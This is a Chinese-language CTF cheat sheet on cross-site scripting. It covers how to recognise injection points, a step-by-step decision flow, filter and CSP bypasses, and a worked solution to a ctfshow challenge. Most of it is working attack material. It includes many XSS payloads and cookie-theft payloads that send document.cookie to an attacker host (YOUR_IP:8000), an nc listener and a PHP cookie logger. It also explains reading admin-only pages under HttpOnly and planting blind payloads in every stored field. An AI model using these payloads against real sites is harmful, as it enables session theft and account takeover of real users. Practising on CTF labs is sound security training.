# XSS 跨站脚本

关键词：XSS 跨站脚本 反射型XSS 存储型XSS DOM型XSS 带外XSS CSP绕过 cookie窃取 bot 盲打

## ① 识别指纹

- 给参数填一个随机串，页面原样吐出来：`?name=hello` → 页面出现 `hello`
- 常见回显点：搜索框、留言板、评论区、昵称/签名、反馈/举报、客服对话
- 提交后**立刻**出现 → 反射型；刷新/重进还在 → 存储型；源码里搜不到但页面有 → DOM 型
- 附件是前端源码，能看到 `innerHTML`、`document.write`、`eval`、`location.hash`、`v-html`、`dangerouslySetInnerHTML`
- 附件是 PHP，能看到 `echo $_GET['x']`、`print_r($x)`、`<?= $name ?>`、`include` 拼进模板
- 题干出现 **"管理员会访问你提交的链接"、"bot"、"提交 URL"、"flag 在 admin 的 cookie 里"** → 带外型
- 题目名带 XSS / BabyXSS / 留言板 / 反馈 / 弹窗 / alert
- 响应头里有 `Content-Security-Policy` → 这题考绕过，不是考弹窗
- 上传点 + 管理员审核 → blind XSS，见 [/web/file-upload](/web/file-upload)

## ② 考什么

- 反射型 / 存储型 / DOM 型三型的判定
- 输出上下文：HTML 正文、属性值、JS 字符串、URL、CSS
- 标签与事件的可用集合（`script` 被禁后还剩什么）
- 字符过滤：`< > " ' ( ) /` 空格 斜杠的逐项测试
- 关键字过滤：`script`、`alert`、`on`、`eval` 的等价写法
- 编码绕过：HTML 实体、URL 编码、Unicode、JS 八进制/十六进制转义
- CSP 策略读取：`unsafe-inline`、`nonce-`、`'self'`、`base-uri`
- Cookie 属性：`HttpOnly`（脚本读不到）、`SameSite`、`Secure`
- 带外外带：XSS 平台、DNSLog、webhook、自己的 HTTP 服务
- admin bot 行为：访问哪个 URL、cookie 在哪个域、停留多久
- blind XSS：所有会入库的字段都当作注入点
- 浏览器侧取数：`document.cookie`、`fetch`、`location`、`new Image()`

## ③ 判断流程

> 从最便宜的探测开始。命中即停，别把整条链走完。

1. **给每个参数塞唯一串** `ctf7xq`，在返回的 HTML 源码里搜这个串 → 找到 → 记下回显位置，进 2；全部参数都搜不到 → 进 9
2. **判上下文**：回显在 `<div>ctf7xq</div>` 里是 HTML 正文；在 `<input value="ctf7xq">` 里是属性；在 `<script>var a='ctf7xq'</script>` 里是 JS 字符串 → 三种上下文对应三套 payload，进 3
3. **读 CSP 响应头** `curl -sI <url> | grep -i content-security-policy` → 没有该头，或策略含 `unsafe-inline` → 进 4；含 `nonce-`，或 `script-src` 只有 `'self'` → 记下策略，进 8
4. **试原始标签**：提交 `<b>ctf7xq</b>` → 页面渲染出粗体说明未做 HTML 编码 → 直接提交 `<script>alert(1)</script>`；弹窗成功 → 题干有 bot 进 10，无 bot 结束；被转成 `&lt;b&gt;` → 进 5
5. **试闭合与事件**：按第 2 条的上下文提交 `"><img src=x onerror=alert(1)>`（属性内）、`'-alert(1)-'`（JS 单引号内）、`";alert(1);//`（JS 双引号内）→ 弹窗成功 → 有 bot 进 10，无 bot 结束；不弹 → 进 6
6. **逐字符测过滤**：分别提交 `<`、`>`、`"`、`'`、`(`、`)`、`/`、空格、`script`，把被吞/被转义的字符列成表 → 用 ④ 的替代表换写法，回 5 重试；表测完仍未弹 → 进 7
7. **换标签与事件**：`script`、`onerror` 都被拦 → 依次试 `<svg onload=alert(1)>`、`<details open ontoggle=alert(1)>`、`<video><source onerror=alert(1)>`、`<body onpageshow=alert(1)>`、`<iframe srcdoc="<script>alert(1)</script>">` → 弹窗成功 → 有 bot 进 10，无 bot 结束；仍不弹 → 进 8
8. **按 CSP 选题**：有 `nonce-` → 刷新两次对比 nonce 是否固定，固定则提交 `<script nonce="<同值>">alert(1)</script>`；只有 `'self'` → 找同源 JSONP 接口、同源上传点、`<script src="/upload/x.js">` → 命中即结束；两条都不成立 → 进 10
9. **查 DOM 型**：页面源码里搜不到 `ctf7xq`，但浏览器渲染出来了 → 打开 DevTools Console，确认 `location.search` / `location.hash` 是否流进 `innerHTML`、`document.write`、`eval`、`insertAdjacentHTML` → 是 → 构造 `#<img src=x onerror=alert(1)>`，结束；否 → 进 10
10. **确认 bot 行为**：题干有管理员访问 → 核对 bot 给的 URL 前缀与页面 `document.domain`，把回连脚本按这个前缀拼好提交 → 接收端收到 cookie 即结束；收不到 → 进 11
11. **cookie 拿不到**：收到的 cookie 为空或没有 flag → `HttpOnly` 生效 → 在 XSS 里用 `fetch('/admin')` 读管理员才能看的页面内容，再把响应外带 → 拿到即结束；仍无 → 进 12
12. **兜底**：以上都不成立 → 回到第 1 条，把 Cookie、`Referer`、`User-Agent`、`X-Forwarded-For`、上传文件名都加进回显点清单，换 HTTP 方法（GET ↔ POST）重扫；再无 → 进 13
13. **盲打**：把外带 payload 塞进所有会入库的字段（用户名、昵称、反馈内容、UA、文件名），等 bot 触发；这类题页面永远不回显，只能靠接收端

## ④ 工具与命令

```bash
# 1. 回显探测：塞唯一串，在响应里找
curl -s "http://t.cn/?q=ctf7xq" | grep -n "ctf7xq"

# 2. 看 CSP 与 Cookie 属性（30 秒决定走内联还是走绕过）
curl -sI "http://t.cn/" | grep -iE "content-security-policy|set-cookie"

# 3. 手工验证反射；--data-urlencode 负责编码，别自己拼 %3C
curl -s -G "http://t.cn/" --data-urlencode 'q=<script>alert(1)</script>'

# 4. POST 型表单
curl -s -X POST "http://t.cn/feedback" --data-urlencode 'msg=<img src=x onerror=alert(1)>'

# 5. 自动化扫描：先手工确认注入点，再用它穷举 payload
dalfox url "http://t.cn/?q=1" --skip-bav
python3 xsstrike.py -u "http://t.cn/?q=1" --crawl
```

```html
<!-- 外带回连：三种都能用，按过滤情况挑 -->
<script>location.href='http://YOUR_IP:8000/?c='+document.cookie</script>
<img src=x onerror="fetch('http://YOUR_IP:8000/?c='+document.cookie)">
<svg onload="new Image().src='http://YOUR_IP:8000/?c='+document.cookie">

<!-- 无括号 / 无引号 / 无空格 的替代表 -->
<svg onload=alert&lpar;1&rpar;>
<img/src=x/onerror=alert(1)>
<details open ontoggle=confirm(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- script 被过滤时 -->
<iframe srcdoc="<script>alert(1)</script>">
<object data="javascript:alert(1)">
<a href="javascript:alert(1)">点我</a>
```

```bash
# 接收端 A：只看请求行，最快
nc -lvnp 8000

# 接收端 B：能落盘，方便复制长 cookie
python3 -m http.server 8000
```

```php
<?php // cookie.php —— 放到自己的 VPS 上，接受 ?c=... 并追加写文件
file_put_contents('cookie.txt', $_GET['c'] . "\n", FILE_APPEND);
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 本地 alert 成功，提交给 bot 后没反应 | payload 拼在了错误的 host 或路径上，bot 访问的是另一个入口 | 用 bot 提供的完整链接，只在参数处替换 |
| 控制台报 CSP 违规，弹窗不出现 | 内联脚本被 `script-src` 拒绝 | 读响应头，改用固定 nonce 或同源 JS 文件 |
| `document.cookie` 为空 | Cookie 设了 `HttpOnly` | 改打 CSRF：`fetch` 后台页面读内容再外带 |
| 输入 `<` 变成 `&lt;` | 服务端做了 HTML 实体编码 | 换属性上下文，或在 DOM sink 处触发 |
| `<script>` 不执行，`<img onerror>` 执行 | 目标用 `innerHTML` 渲染，插入的 script 不执行 | 用带事件属性的标签 |
| 加了 `alert(1)` 直接 500 | WAF 拦关键字 | 先测 WAF 拦截边界，再用 `confirm`/`prompt`/`atob` 变形 |
| 自己能看到弹窗，bot 看不到 | 存储型内容被缓存，bot 读的是旧页面 | 提交后强刷详情页，确认真入库 |
| 收到 cookie 但没有 flag | flag 不在 cookie 里 | 用 XSS 请求 `/flag` 一类接口，把响应外带 |

## ⑥ 例题

**题目**：`ctfshow Web 入门 XSS · web316`
**来源**：ctfshow 靶场 XSS 系列（BUUCTF 有同源镜像）
**题干**（大意）：一个输入框 + "生成链接"按钮，提示管理员会定时访问提交的链接，flag 在管理员的 cookie 里。

**关键观察**：输入什么就原样出现在页面 HTML 的正文位置，没有编码、没有过滤；管理员由平台按固定间隔拉起，访问你提交的 URL。所以这题不是"弹个窗"，而是"把管理员的 cookie 发出来"。

**走了哪条链**：第 1 条（参数有回显）→ 第 2 条（HTML 正文上下文）→ 第 3 条（响应头无 CSP）→ 第 4 条（`<script>` 未被编码，弹窗成功）→ 第 10 条（有 bot，改为外带回连）。

**命令与输出**：

```bash
# 自己的 VPS 上开接收端
python3 -m http.server 8000
```

提交的 payload：

```html
<script>location.href='http://YOUR_IP:8000/?c='+document.cookie</script>
```

接收端日志（cookie 内容随实例变化，这里只标形状）：

```text
YOUR_IP - - [..] "GET /?c=<管理员 cookie，其中含 flag> HTTP/1.1" 200 -
```

**结果**：把收到的 cookie 提交到题目的校验框，通过。若日志里出现的是自己的请求、内容为 `flag=you are not admin no flag`，说明 bot 还没来，继续等下一轮。

::: tip flag 说明
本题 flag 存在管理员 cookie 中，随实例生成，不在页内固定。练习目标是**走通判断流程并拿到 bot 的 cookie**，不是背 flag。同系列的 web317 起会过滤 `script`/`img`，判断流程不变，第 7 条（换标签）成为主战场。
:::
